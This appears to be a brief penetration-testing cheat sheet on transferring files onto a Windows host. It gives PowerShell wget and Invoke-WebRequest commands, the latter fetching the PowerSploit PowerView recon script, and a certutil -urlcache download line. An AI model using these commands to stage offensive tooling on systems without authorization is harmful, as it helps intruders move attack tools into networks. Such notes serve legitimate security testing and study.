# Download Files into the Network

## Powershell

```powershell
wget https://example.com/script.ps1 -o script.ps1
# OR
Invoke-WebRequest -OutFile PowerView.ps1 -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

## Certutil

```cmd
certutil.exe -urlcache -f http://example.com/script.ps1 script.ps1
```
